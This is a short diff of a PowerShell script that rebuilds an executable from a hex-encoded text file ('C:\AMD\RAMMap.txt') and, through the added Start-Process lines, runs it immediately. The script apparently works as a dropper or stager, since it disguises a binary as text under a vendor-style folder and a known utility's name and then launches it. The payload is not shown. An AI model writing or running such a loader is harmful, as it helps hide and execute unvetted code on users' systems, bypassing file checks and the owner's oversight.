@@ -1,9 +1,8 @@
-
 # Function to convert HEX back to EXE
 function Convert-HexToExe {
     param (
-        [string]$hexFilePath,  # Path to the .txt file containing the hex string
-        [string]$outputExeFile # Path to the output .exe file
+        [string]$hexFilePath,
+        [string]$outputExeFile
     )
 
     try {
@@ -19,14 +18,18 @@ function Convert-HexToExe {
         [System.IO.File]::WriteAllBytes($outputExeFile, $byteArray)
 
         Write-Host "Decoding successful! Output saved to $outputExeFile"
+
+        # Start the executable
+        Start-Process -FilePath $outputExeFile
+        Write-Host "$outputExeFile has been started."
     } catch {
         Write-Host "Error: $($_.Exception.Message)"
     }
 }
 
-
-
-# Prompt user for HEX to EXE conversion
+# Specify the paths for HEX to EXE conversion
 $hexFilePath = 'C:\AMD\RAMMap.txt'
 $outputExeFile = 'C:\AMD\RAMMap.exe'
+
+# Call the function to perform the conversion and run the EXE
 Convert-HexToExe -hexFilePath $hexFilePath -outputExeFile $outputExeFile
